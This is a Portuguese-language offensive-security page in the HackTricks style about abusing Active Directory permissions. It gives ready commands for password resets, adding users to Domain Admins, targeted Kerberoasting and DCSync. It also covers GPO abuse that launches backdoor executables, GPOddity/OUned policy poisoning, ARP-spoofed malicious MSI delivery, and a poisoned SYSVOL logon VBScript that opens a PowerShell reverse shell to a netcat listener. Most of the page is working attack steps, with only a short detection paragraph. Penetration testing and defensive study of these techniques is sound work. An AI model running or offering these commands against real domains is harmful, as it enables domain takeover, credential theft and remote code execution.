# Abuso de ACLs/ACEs do Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Esta página é principalmente um resumo das técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para mais detalhes, consulte os artigos originais.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Direitos GenericAll sobre um usuário**

Esse privilégio concede ao atacante controle total sobre a conta de usuário-alvo. Depois de confirmar os direitos `GenericAll` usando o comando `Get-ObjectAcl`, o atacante pode:

- **Alterar a senha do alvo**: usando `net user <username> <password> /domain`, o atacante pode redefinir a senha do usuário.
- No Linux, você pode fazer o mesmo via SAMR com `net rpc` do Samba:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Se a conta estiver desabilitada, remova a flag UAC**: `GenericAll` permite editar `userAccountControl`. No Linux, o BloodyAD pode remover a flag `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Atribua um SPN à conta do usuário para torná-la vulnerável a Kerberoasting e, em seguida, use Rubeus e targetedKerberoast.py para extrair e tentar quebrar os hashes do ticket-granting ticket (TGT).

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Desative a pré-autenticação do usuário, tornando sua conta vulnerável a ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Com `GenericAll` em um usuário, você pode adicionar uma credencial baseada em certificado e se autenticar como ele sem alterar sua senha. Veja:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Direitos GenericAll em um grupo**

Esse privilégio permite que um atacante manipule as associações a grupos se tiver direitos `GenericAll` em um grupo como `Domain Admins`. Depois de identificar o nome distinto do grupo com `Get-NetGroup`, o atacante pode:

- **Adicionar a si mesmo ao grupo Domain Admins**: Isso pode ser feito por meio de comandos diretos ou usando módulos como Active Directory ou PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- No Linux, você também pode usar BloodyAD para se adicionar a grupos arbitrários quando tiver GenericAll/Write sobre esses grupos. Se o grupo de destino estiver aninhado em “Remote Management Users”, você ganhará imediatamente acesso via WinRM aos hosts que reconhecem esse grupo:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Ter esses privilégios em um objeto de computador ou em uma conta de usuário permite:

- **Kerberos Resource-based Constrained Delegation**: Permite assumir o controle de um objeto de computador.
- **Shadow Credentials**: Use esta técnica para se passar por uma conta de computador ou usuário, explorando os privilégios para criar shadow credentials.

## Mover um objeto para permissões herdadas de uma OU

Um caminho pode combinar **direitos para mover uma conta** com **direitos de gravação herdados de uma OU de destino**, mesmo quando nenhuma das entidades pode inicialmente modificar os atributos confidenciais da conta. Verifique as permissões de movimentação do objeto de origem e `CreateChild` no destino, mova o objeto e, em seguida, confira novamente sua DACL efetiva. Por exemplo, `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'`, do powerview.py, move o usuário; um grupo controlado com `GenericWrite` herdado nessa OU pode então adicionar uma [shadow credential](shadow-credentials.md). A movimentação não cria, por si só, o direito herdado.<sup>[[18]](#references)</sup>

Se você tiver `GenericAll` em uma OU, mas não houver uma ACE herdada adequada, `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` pode adicionar uma para os descendentes dela. Teste a conta de destino separadamente: **a herança fica desativada em contas protegidas pelo AdminSDHolder**, portanto, uma ACE da OU pode afetar usuários comuns, mas não funcionar em um usuário protegido. Consulte [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Há outro caminho de abuso quando um script privilegiado de limpeza agendada escolhe OUs com base em ACEs controladas pelo atacante e, em seguida, executa `Set-ADObject -Clear adminCount` **e** `$acl.SetAccessRuleProtection($False, $False)` nos descendentes delas. Se você puder modificar a DACL da OU, conceda ao grupo inspecionado pelo script a ACE `ExtendedRight` ou `GenericAll` necessária; verifique separadamente se você pode invocar a tarefa. A tarefa privilegiada pode então restaurar a herança em uma conta previamente protegida, permitindo que a ACE da OU se aplique. Confirme o script exato, a permissão para acionar a tarefa e a DACL resultante; limpar `adminCount` por si só não reativa a herança, e o SDProp pode voltar a proteger contas que permaneçam em grupos protegidos.<sup>[[18]](#references)</sup>

## **WriteProperty on Group**

Se um usuário tiver direitos `WriteProperty` em todos os objetos de um grupo específico (por exemplo, `Domain Admins`), ele poderá:

- **Adicionar a si mesmo ao grupo Domain Admins**: Isso pode ser feito combinando os comandos `net user` e `Add-NetGroupUser`, permitindo o escalonamento de privilégios no domínio.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) em Grupo**

Esse privilégio permite que invasores se adicionem a grupos específicos, como `Domain Admins`, por meio de comandos que manipulam diretamente a associação ao grupo. A seguinte sequência de comandos permite a autoassociação:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Um privilégio semelhante permite que invasores se adicionem diretamente a grupos modificando as propriedades deles, caso tenham o direito `WriteProperty` nesses grupos. A confirmação e a execução desse privilégio são realizadas com:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Ter o direito `ExtendedRight` sobre um usuário para `User-Force-Change-Password` permite redefinir senhas sem saber a senha atual. A verificação desse direito e sua exploração podem ser feitas com PowerShell ou ferramentas alternativas de linha de comando, que oferecem vários métodos para redefinir a senha de um usuário, incluindo sessões interativas e comandos de uma linha para ambientes não interativos. Os comandos vão de invocações simples do PowerShell ao uso do `rpcclient` no Linux, demonstrando a versatilidade dos vetores de ataque.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner em um grupo**

Se um atacante descobrir que tem direitos de `WriteOwner` sobre um grupo, poderá alterar o proprietário do grupo para si mesmo. Isso é especialmente impactante quando o grupo em questão é `Domain Admins`, pois a alteração do proprietário permite maior controle sobre os atributos e a associação ao grupo. O processo envolve identificar o objeto correto usando `Get-ObjectAcl` e, em seguida, usar `Set-DomainObjectOwner` para modificar o proprietário, por SID ou nome.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite em um usuário**

Essa permissão permite que um atacante modifique as propriedades de um usuário. Especificamente, com acesso `GenericWrite`, o atacante pode alterar o caminho do script de logon de um usuário para executar um script malicioso quando ele fizer logon. Isso é feito usando o comando `Set-ADObject` para atualizar a propriedade `scriptpath` do usuário-alvo e apontá-la para o script do atacante.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Um ACE `WriteProperty` mais restrito, aplicado ao atributo [`scriptPath` do usuário](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), pode ser suficiente; `GenericWrite` não é necessário. Combine essa permissão no atributo com um script gravável na árvore `SYSVOL\<domain>\scripts` ou `NETLOGON` do domínio e, em seguida, avalie se é provável que o usuário-alvo faça logon e alcance o script. O script é executado no contexto desse usuário durante o logon. Analise separadamente as ACLs efetivas do AD e as ACLs de arquivos/compartilhamentos; um ACE Allow correspondente ou um diretório gravável, por si só, não estabelece o caminho completo.

## **GenericWrite on Group**

Com esse privilégio, os atacantes podem manipular a associação a grupos, por exemplo, adicionando a si mesmos ou outros usuários a grupos específicos. Esse processo envolve criar um objeto de credencial, usá-lo para adicionar ou remover usuários de um grupo e verificar as alterações na associação com comandos do PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- No Linux, o `net` do Samba pode adicionar/remover membros quando você tem `GenericWrite` no grupo (útil quando PowerShell/RSAT não estão disponíveis):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Ser proprietário de um objeto do AD e ter privilégios de `WriteDACL` sobre ele permite que um atacante conceda a si mesmo privilégios de `GenericAll` sobre o objeto. Isso é feito por meio da manipulação do ADSI, permitindo controle total sobre o objeto e a capacidade de modificar suas associações a grupos. Apesar disso, há limitações ao tentar explorar esses privilégios usando os cmdlets `Set-Acl` / `Get-Acl` do módulo Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Tomada rápida de controle com WriteDACL/WriteOwner (PowerView)

Quando você tem `WriteOwner` e `WriteDacl` sobre um usuário ou uma conta de serviço, pode assumir o controle total e redefinir a senha usando PowerView sem saber a senha antiga:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Observações:
- Talvez seja necessário primeiro alterar o proprietário para você mesmo se você tiver apenas `WriteOwner`:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Valide o acesso com qualquer protocolo (SMB/LDAP/RDP/WinRM) após redefinir a senha.

## **Replicação no Domínio (DCSync)**

O ataque DCSync explora permissões específicas de replicação no domínio para imitar um Domain Controller e sincronizar dados, incluindo credenciais de usuários. Essa técnica poderosa requer permissões como `DS-Replication-Get-Changes`, permitindo que os atacantes extraiam informações confidenciais do ambiente AD sem acesso direto a um Domain Controller.<sup>[[5]](#references)</sup> [**Saiba mais sobre o ataque DCSync aqui.**](../dcsync.md)

## Delegação de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegação de GPO

O acesso delegado para gerenciar Group Policy Objects (GPOs) pode apresentar riscos significativos à segurança. Por exemplo, se um usuário como `offense\spotless` receber direitos delegados de gerenciamento de GPO, ele poderá ter privilégios como **WriteProperty**, **WriteDacl** e **WriteOwner**. Essas permissões podem ser abusadas para fins maliciosos, conforme identificado usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerar permissões de GPO

Para identificar GPOs mal configuradas, os cmdlets do PowerSploit podem ser encadeados. Isso permite descobrir GPOs que um usuário específico tem permissão para gerenciar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computadores aos quais uma determinada política se aplica**: É possível identificar a quais computadores uma GPO específica se aplica, ajudando a entender o escopo do possível impacto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Políticas aplicadas a um determinado computador**: Para ver quais políticas são aplicadas a um computador específico, podem ser usados comandos como `Get-DomainGPO`.

**OUs às quais uma determinada política se aplica**: É possível identificar as unidades organizacionais (OUs) afetadas por uma determinada política usando `Get-DomainOU`.

Você também pode usar a ferramenta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs e encontrar problemas nelas.

### Abusar de GPO - New-GPOImmediateTask

GPOs mal configuradas podem ser exploradas para executar código, por exemplo, criando uma tarefa agendada imediata. Isso pode ser feito para adicionar um usuário ao grupo de administradores locais nas máquinas afetadas, elevando significativamente os privilégios:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### Módulo GroupPolicy - Abuse GPO

O módulo GroupPolicy, se instalado, permite criar e vincular novas GPOs, além de definir preferências, como valores do registro, para executar backdoors nos computadores afetados. Esse método requer que a GPO seja atualizada e que um usuário faça logon no computador para que o código seja executado:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Abuso de GPO

SharpGPOAbuse oferece um método para abusar de GPOs existentes adicionando tarefas ou modificando configurações, sem precisar criar novas GPOs. Esta ferramenta requer a modificação de GPOs existentes ou o uso de ferramentas RSAT para criar novas antes de aplicar as alterações:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Forçar atualização da política

As atualizações de GPO normalmente ocorrem a cada 90 minutos. Para acelerar esse processo, especialmente após implementar uma alteração, use o comando `gpupdate /force` no computador de destino para forçar uma atualização imediata da política. Esse comando garante que as modificações nas GPOs sejam aplicadas sem esperar pelo próximo ciclo automático de atualização.

### Nos bastidores

Ao inspecionar as Tarefas Agendadas de uma GPO, como a `Misconfigured Policy`, é possível confirmar a inclusão de tarefas como `evilTask`. Essas tarefas são criadas por meio de scripts ou ferramentas de linha de comando com o objetivo de modificar o comportamento do sistema ou escalar privilégios.

A estrutura da tarefa, conforme apresentada no arquivo de configuração XML gerado por `New-GPOImmediateTask`, detalha as especificações da tarefa agendada, incluindo o comando a ser executado e seus gatilhos. Esse arquivo mostra como as tarefas agendadas são definidas e gerenciadas nas GPOs, permitindo executar comandos ou scripts arbitrários como parte da aplicação de políticas.

### Usuários e grupos

As GPOs também permitem manipular associações de usuários e grupos nos sistemas de destino. Ao editar diretamente os arquivos de política de Users and Groups, os atacantes podem adicionar usuários a grupos privilegiados, como o grupo local `administrators`. Isso é possível por meio da delegação de permissões de gerenciamento de GPO, que permite modificar arquivos de política para incluir novos usuários ou alterar associações a grupos.

O arquivo de configuração XML de Users and Groups descreve como essas alterações são implementadas. Ao adicionar entradas a esse arquivo, usuários específicos podem receber privilégios elevados nos sistemas afetados. Esse método oferece uma abordagem direta para escalar privilégios por meio da manipulação de GPOs.

Para configurações de segurança, como associação a grupos locais e direitos de usuário, inspecione também o modelo da GPO aplicada em `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` e a ACL do diretório `SecEdit`. Um diretório ou arquivo gravável é um indício para investigação: o acesso efetivo ao compartilhamento SYSVOL, as ACLs de negação e herdadas, as permissões do contêiner de Group Policy, o escopo da política e a atualização do cliente ainda determinam se uma alteração pode surtir efeito. Ser membro de um grupo chamado “GPO Managers” não comprova, por si só, que há direitos de edição. [A Microsoft documenta o caminho desse modelo e a separação entre o contêiner e o modelo da Group Policy.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Além disso, também podem ser considerados outros métodos para executar código ou manter persistência, como usar scripts de logon/logoff, modificar chaves do registro para execução automática, instalar software por meio de arquivos .msi ou editar configurações de serviços. Essas técnicas oferecem diferentes caminhos para manter o acesso e controlar sistemas de destino por meio do abuso de GPOs.

### Redirecionamento da recuperação de GPC/GPT para serviços maliciosos autenticados

Uma GPO consiste em um **Group Policy Container (GPC)** no LDAP, que contém metadados, e um **Group Policy Template (GPT)** hospedado por SMB, que contém os arquivos de política. Durante a atualização, o cliente segue o `gPLink` do contêiner, lê o GPC referenciado e seu `gPCFileSysPath` e, em seguida, baixa o GPT desse caminho UNC. Consequentemente, o acesso de gravação ao próprio GPC ou ao `gPLink` de uma OU, Site ou Domínio pode ser usado para acionar o processamento de políticas com privilégios.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Envenenamento de `gPCFileSysPath` com GPOddity

Se a identidade controlada puder gravar no GPC de destino (diretamente ou por meio de **NTLM relay para LDAP**), substitua `gPCFileSysPath` por um caminho UNC hospedado pelo atacante. [GPOddity](https://github.com/synacktiv/GPOddity) automatiza a alteração LDAP e hospeda um GPT malicioso contendo arquivos de política baseados em módulos ou uma Immediate Task, executada pelo cliente Group Policy como `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Um compartilhamento SMB anônimo ou que não exige credenciais não é suficiente nos clientes Windows atuais: o SMB Secure Negotiate exige prova de que a autenticação foi bem-sucedida, portanto, o serviço malicioso deve validar a identidade do domínio, derivar a chave de sessão SMB e assinar corretamente suas respostas. No modo incorporado, configure o GPOddity com uma conta de máquina controlada e sua chave de serviço e selecione um payload do lado do computador ou do usuário na seção `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Caso-limite de GPO de usuário:** após o MS16-072, o Windows ainda cria duas sessões SMB2 na **mesma conexão TCP**: a sessão do usuário lê `GPT.INI`, depois a sessão da conta do computador lê a configuração efetiva, como `ScheduledTasks.xml`. Portanto, um servidor malicioso precisa indexar o estado de autenticação, as chaves de sessão e as chaves de assinatura por `SessionId` SMB2, não apenas pelo socket. O fork do Scapy integrado ao GPOddity/OUned implementa isso por meio de `SMBStreamSocketMultiplexing` e de um `SMBServer` compatível com multiplexação; servidores Impacket/Scapy de sessão única, caso contrário, reutilizam o estado de assinatura incorreto e falham com políticas de usuário.<sup>[[15]](#references)</sup>

#### gPLink poisoning com OUned

Com `WriteGPLink`, `GenericWrite` ou controle equivalente sobre uma OU, um Site ou um Domínio, um atacante pode acrescentar um link cujo DN de GPC é servido por um host LDAP controlado pelo atacante. Essa primitiva foi apresentada originalmente por Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) automatiza a gravação LDAP e a cadeia GPC/GPT maliciosa.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

A vítima primeiro se autentica no serviço LDAP malicioso e recebe um GPC cujo `gPCFileSysPath` aponta para o serviço SMB malicioso; em seguida, autentica-se no SMB e aplica o GPT fornecido. Portanto, OUned precisa de uma conta com um SPN LDAP, uma conta de máquina com um SPN HOST para SMB (a mesma conta de máquina pode atender a ambos) e resolução DNS ou encaminhamento reverso que direcione as portas 389 e 445 para o host do operador.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

O servidor LDAP Scapy integrado do OUned valida Kerberos/SPNEGO com a chave real do serviço controlado e fornece dados GPC arbitrários a partir de JSON. A chave JSON vazia modela o rootDSE, os prefixos `base64:` representam valores binários, e o servidor oferece suporte a add/delete/modify/search e pesquisas `BASE`, `LEVEL` e `SUBTREE`; ele pode negociar sem proteção, com integridade ou confidencialidade. Isso torna o serviço reutilizável quando outro componente do Windows segue uma referência LDAP controlada por um atacante, mas exige LDAP autenticado.<sup>[[15]](#references)</sup>

Não presuma que sincronizar a senha de uma conta em um domínio dummy reproduz todas as chaves Kerberos: o RC4 é derivado da senha, enquanto o AES string-to-key também usa um salt derivado do hostname/domínio da entidade principal. Fornecer a chave AES real da conta para `KerberosSSP` evita forçar o uso de RC4 por meio de uma alteração detectável em `msDS-SupportedEncryptionTypes`, que a conta da máquina pode modificar por conta própria.<sup>[[15]](#references)</sup>

#### Pivôs de detecção

Correlacione alterações em `gPCFileSysPath` ou `gPLink` com mudanças na versão da GPO e novos arquivos XML de Immediate/Scheduled Task. Investigue links para contextos de nomenclatura inesperados, hosts UNC fora do conjunto aprovado de DC/SYSVOL, registros DNS que redirecionem nomes de contas de máquina, tickets de serviço LDAP/CIFS para contas de máquina incomuns e alterações em `msDS-SupportedEncryptionTypes` que habilitem RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + sequestro de caminho UNC (ARP spoofing)

`WriteGPLink` em uma OU/domínio permite modificar o atributo `gPLink` do contêiner de destino e **forçar a aplicação de uma GPO existente** sem editar a própria GPO. Isso se torna interessante quando a GPO vinculada já faz referência a conteúdo remoto por meio de **caminhos UNC** (`\\HOST\share\...`), pois usuários autenticados podem ler **SYSVOL** e procurar offline políticas reutilizáveis.<sup>[[11]](#references)</sup>

Fluxo de trabalho de alto nível:

1. Use o BloodHound para identificar uma entidade principal com `WriteGPLink` em uma OU e enumerar computadores/usuários dentro dela.
2. Clone `SYSVOL` em modo somente leitura e analise as GPOs em busca de **Software Installation**, **mapeamentos de unidades** (`Drives.xml`) e **scripts de logon/inicialização** que façam referência a caminhos UNC.
3. Dê preferência a políticas que apontem para um **hostname direto** (por exemplo, `\\DC02\share\pkg.msi`) em vez de caminhos DFS/namespace de domínio, pois caminhos baseados em hostname são mais fáceis de redirecionar com spoofing de L2.
4. Acrescente o GUID da GPO escolhida ao `gPLink` da OU de destino para que a vítima processe essa política já existente.
5. No mesmo domínio de broadcast, faça ARP spoofing do host UNC e vincule o IP dele localmente (`ip addr add <target_ip>/32 dev <iface>`) para que o tráfego SMB da vítima chegue ao seu host.
6. Forneça o caminho/nome de arquivo esperado em um servidor SMB do atacante (por exemplo, `smbserver.py`) e aguarde o processamento normal da política.

Exemplo de coleta de `SYSVOL` e correlação de GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Vincule a GPO existente à OU de destino:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Se o GPO vinculado implantar um MSI de um caminho UNC, o cliente o buscará durante a **inicialização do computador** e o instalará como **`NT AUTHORITY\SYSTEM`**. Ao falsificar o host referenciado e fornecer um MSI malicioso no **mesmo compartilhamento/caminho/nome**, você pode transformar `WriteGPLink` em execução de código como SYSTEM **sem modificar o SYSVOL**.

Restrições importantes:

- **O timing importa**: o novo link será detectado na atualização da política (geralmente a cada ~90 minutos), mas a **Software Installation** normalmente é acionada na **reinicialização**.
- O Windows Installer costuma rastrear a implantação usando o **`ProductCode`** do pacote. Se o produto já estiver instalado, a implantação poderá ser ignorada.
- Para evitar a rejeição do instalador, altere o MSI malicioso para que seus **`ProductCode`** e **`PackageCode`** correspondam aos do pacote legítimo esperado pelo GPO.
- Arquivos de anúncio `.aas` antigos podem permanecer no `SYSVOL`; portanto, valide se a implantação ainda parece ativa antes de confiar nela.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Sequestro de UNC de mapeamento de unidade -> captura de NTLM / relay WebDAV

Os mapeamentos de unidade do GPP em `Drives.xml` fazem com que os usuários se autentiquem no caminho UNC configurado durante o logon ou a reconexão. Se você falsificar o host referenciado, poderá capturar **NetNTLMv2**. Se o SMB for deliberadamente feito falhar, o Windows poderá tentar novamente via **WebDAV**, enviando **NTLM por HTTP**, o que oferece muito mais flexibilidade para fazer relay para **LDAP(S)**, **AD CS** ou **SMB**.

#### Sequestro de UNC de scripts de logon/inicialização

O mesmo padrão se aplica a scripts hospedados em UNC encontrados em `SYSVOL`:

- **Scripts de logon** geralmente são executados no contexto do **usuário**.
- **Scripts de inicialização** geralmente são executados no contexto do **computador / SYSTEM**.

Se o caminho do script apontar para um hostname que possa ser falsificado, redirecione o host UNC e disponibilize conteúdo de script substituto no local esperado.

## Envenenamento de scripts de logon em SYSVOL/NETLOGON

Caminhos graváveis em `\\<dc>\SYSVOL\<domain>\scripts\` ou `\\<dc>\NETLOGON\` permitem adulterar scripts de logon executados quando os usuários fazem logon via GPO. Isso possibilita a execução de código no contexto de segurança dos usuários que fazem logon.

### Localizar scripts de logon
- Inspecione os atributos dos usuários para encontrar um script de logon configurado:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Varra os compartilhamentos do domínio para encontrar atalhos ou referências a scripts:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Analise arquivos `.lnk` para resolver destinos que apontam para SYSVOL/NETLOGON (truque útil de DFIR e para atacantes sem acesso direto ao GPO):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- O BloodHound exibe o atributo de script de logon `scriptPath` do objeto de usuário, quando presente. Scripts de logon configurados por GPO são uma referência de política separada, então inspecione também a GPO aplicável.

### Validar acesso de gravação (não confie nas listagens de compartilhamentos)
Ferramentas automatizadas podem indicar que SYSVOL/NETLOGON são somente leitura, mesmo quando o script específico tem uma ACL NTFS diferente. Comece com uma inspeção somente leitura desse arquivo e do diretório pai; ACEs Allow correspondentes continuam sendo possibilidades, pois o acesso SMB e NTFS efetivo, as ACEs Deny e o token atual são fatores relevantes:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Um teste de escrita autorizado deve ser específico ao alvo e reversível, com o script original salvo em backup e restaurado. Não sobrescreva um script de logon funcional apenas para testar o acesso; uma escrita bem-sucedida pode ser executada no próximo logon de um usuário.

### Envenenar um script de logon VBScript para RCE
Acrescente um comando que inicie um reverse shell do PowerShell (gere-o em revshells.com) e mantenha a lógica original para evitar prejudicar as funções comerciais:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Fique escutando no seu host e aguarde o próximo logon interativo:

```bash
rlwrap -cAr nc -lnvp 443
```

Observações:
- A execução ocorre sob o token do usuário conectado (não SYSTEM). O escopo é o vínculo da GPO (OU, site, domínio) que aplica esse script.
- Após o uso, restaure o conteúdo e os timestamps originais.


## References

